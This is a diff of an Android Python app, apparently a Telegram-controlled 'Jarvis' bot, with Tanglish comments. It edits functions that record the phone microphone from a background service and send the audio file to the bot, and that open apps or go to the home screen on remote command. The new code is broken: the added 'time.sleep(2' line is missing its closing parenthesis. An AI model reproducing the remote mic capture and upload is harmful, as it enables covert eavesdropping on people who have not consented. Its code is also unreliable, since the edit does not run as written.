@@ -49,81 +49,36 @@ def internet():
         return result.status_code == 200
     except Exception as error: return False
 
-def get_safe_context():
-    # 1. Cache-a bypass panna list of possible names
-    class_names = [
-        'shadow.bridge.shadow.ServiceMyservice',     # Pudhu name
-        'shaow.bridge.shadow.ServiceMyservice',      # Typo irundha idhu work aagum
-        'org.test.foregroundapp.ServiceMyservice',   # Cache clear aagalana idhu work aagum
-        'org.kivy.android.PythonService'             # Pazhaya Kivy version-a irundha idhu
-    ]
-    
-    for name in class_names:
-        try:
-            Service = autoclass(name)
-            if hasattr(Service, 'mService') and Service.mService is not None:
-                return Service.mService
-        except Exception:
-            continue
-            
-    # 2. Mela irukka Kivy classes edhuvume kidaikkalana, Android-oda Root-la irundhu App Context-a force panni edukkurom! (Idhu fail aagave aagadhu)
-    try:
-        ActivityThread = autoclass('android.app.ActivityThread')
-        return ActivityThread.currentApplication().getApplicationContext()
-    except Exception:
-        pass
-        
-    return None # Edhume kidaikkala na mattum dhaan None varum
-
-
-
 def start_recording(sec=10):
     try:
-        # 1. Android Native Classes-a edukkurom (PythonActivity thevaiyillai!)
+        time.sleep(2
         MediaRecorder = autoclass('android.media.MediaRecorder')
         AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
         OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
         AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
-
-        # 2. Service context edukkurom (Background service-kku idhu dhaan mukkiyam)
-        context = get_safe_context()
-        
-        # 3. File save panna path ready pandrom (App-oda internal folder)
+        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
         save_dir = context.getExternalFilesDir(None).getAbsolutePath()
         file_path = os.path.join(save_dir, "jarvis_record.m4a")
-
-        # 4. Recorder setup pandrom
         recorder = MediaRecorder()
-        recorder.setAudioSource(AudioSource.MIC) # Mic-la irundhu audio edukka
-        recorder.setOutputFormat(OutputFormat.MPEG_4) # MP4 format-la save panna
-        recorder.setAudioEncoder(AudioEncoder.AAC) # Nalla audio quality-kku
-        recorder.setOutputFile(file_path) # File path-a set pandrom
-
-        # 5. Recording start pandrom
+        recorder.setAudioSource(AudioSource.VOICE_RECOGNITION)
+        recorder.setOutputFormat(OutputFormat.MPEG_4)
+        recorder.setAudioEncoder(AudioEncoder.AAC)
+        recorder.setOutputFile(file_path)
         send_message('Preparing Mic...')
         recorder.prepare()
         recorder.start()
         send_message(f'Listening `{sec}`s...')
-
-        # 6. Neenga kudutha time (sec) varaikum record aagum
         time.sleep(sec)
-
-        # 7. Recording-a safe-a stop pandrom
         recorder.stop()
         recorder.release()
-        
-        # 8. Telegram bot-kku audio file-a anuppudhu
         send_document(file_path, 'Recording Saved Successfully')
-
-    except Exception as error:
-        # Edhavadhu prechanai na bot-kku error message pogum
-        send_message(f'Mic Problem: `{error}`')
+    except Exception as error: send_message(f'Mic Problem: `{error}`')
 
 def go_home():
     try:
         time.sleep(2)
         Intent = autoclass('android.content.Intent')
-        context = get_safe_context()
+        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
         intent = Intent(Intent.ACTION_MAIN)
         intent.addCategory(Intent.CATEGORY_HOME)
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -134,7 +89,7 @@ def go_home():
 def open_app(package_name):
     try:
         time.sleep(2)
-        context = get_safe_context()
+        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
         pm = context.getPackageManager()
         intent = pm.getLaunchIntentForPackage(package_name)
         if intent is not None:
@@ -142,8 +97,7 @@ def open_app(package_name):
             context.startActivity(intent)
             send_message(f'App Opened.')
         else: send_message(f'App `{package_name}` Not Found In Phone!')
-    except Exception as error:
-        send_message(f'Opening Error: `{error}`')
+    except Exception as error: send_message(f'Opening Error: `{error}`')
 
 def gen_response(cmd):
     try:
